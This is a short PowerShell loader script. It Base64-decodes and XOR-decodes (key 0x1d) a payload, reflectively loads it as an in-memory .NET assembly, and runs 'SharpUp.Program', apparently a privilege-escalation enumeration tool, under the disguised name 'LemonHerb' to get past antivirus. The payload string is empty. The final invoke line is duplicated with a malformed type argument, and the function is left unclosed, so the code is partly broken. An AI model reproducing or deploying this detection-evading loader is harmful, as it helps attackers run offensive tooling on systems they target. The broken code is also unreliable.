$718d29e9 = ""
function Load-LemonHerb {
$fb = [Convert]::FromBase64String($718d29e9)
for($i=0; $i -lt $fb.count ; $i++) {$fb[$i] = $fb[$i] -bxor 0x1d}
[System.Reflection.Assembly]::Load($fb)
}
$asm = Load-LemonHerb
function Invoke-LemonHerb { param([Parameter ()] $Args = "")
$Args -eq "" -and ($Args = Read-Host "Specify command arguments")
$asm.GetType("SharpUp.Program", [Reflection.BindingFlags] "Public,NonPublic,Static").GetMethod("Main", ([Reflection.BindingFlags] "Public,NonPublic,Static")).Invoke($null, (, $Args.split()))
$asm.GetType([SharpUp.Program], [Reflection.BindingFlags] "Public,NonPublic,Static").GetMethod("Main", ([Reflection.BindingFlags] "Public,NonPublic,Static")).Invoke($null, (, $Args.split()))
